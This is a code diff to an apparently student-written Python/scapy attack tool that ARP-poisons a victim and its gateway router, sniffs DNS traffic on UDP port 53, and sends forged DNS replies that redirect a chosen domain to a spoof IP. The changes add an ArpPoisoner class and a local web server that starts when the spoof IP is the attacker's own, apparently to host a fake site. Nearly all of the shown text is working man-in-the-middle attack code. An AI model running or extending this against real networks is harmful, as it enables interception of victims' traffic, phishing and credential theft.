@@ -1,8 +1,9 @@
-from arp_poison import run as arp_poison_run
+from arp_poison import ArpPoisoner
 from scapy.all import *
 import threading
 import time
 from utils import get_gateway_ip, network_utils
+from website import host
 # First: we need to poison the gateway router and the victim's ARP table for the gateway router.
 # Then we need to send a DNS request for the to-be-spoofed domain, to analyze the response.
 # We then spoof the reponse so it reroutes the domain the the spoof ip, and spam this spoofed response to the victim.
@@ -12,7 +13,7 @@ def run(args):
     spoof_ip = args.spoof_ip
     interface = args.interface
     victim_ip = args.victim_ip
-
+    route_to_local = spoof_ip == get_if_addr(interface)
     # Spoof the gateway router
     gateway_ip = get_gateway_ip.find_gateway_ip()
     args.gateway_ip = gateway_ip
@@ -47,10 +48,18 @@ def run(args):
                 print("Sent spoofed DNS response for {} to {}".format(dns_req, spoof_ip))
 
     try:
-        arp_poison_thread = threading.Thread(target=arp_poison_run, args=(args, stop_event))
-        arp_poison_thread.setDaemon(True)
-        arp_poison_thread.start()
+        #arp_poison_thread = threading.Thread(target=arp_poison_run, args=(args, stop_event))
+        #arp_poison_thread.setDaemon(True)
+        #arp_poison_thread.start()
+        poisoner = ArpPoisoner(args)
+        poisoner.start()
+        if (route_to_local):
 
+            print("Spoof IP is the same as the attacker's IP. Loading up website...")
+            website_thread = threading.Thread(target=host.run)
+            website_thread.setDaemon(True)
+            website_thread.start()
+        print("Started sniffing udp port 53...")
         sniff(filter="udp port 53", prn=dns_spoof_packet, iface=interface)
         print("Stopping sniffing... (Ctrl+C again to stop the ARP Poisoning too.)")
 
@@ -58,8 +67,12 @@ def run(args):
             time.sleep(0.5)
             print("Schleep")
     except (KeyboardInterrupt, SystemExit):
+        print("Interrupted, joining threads...")
         stop_event.set()
-        arp_poison_thread.join()
+        #arp_poison_thread.join()
+        if (route_to_local):
+            
+            website_thread.join()
     
     
 
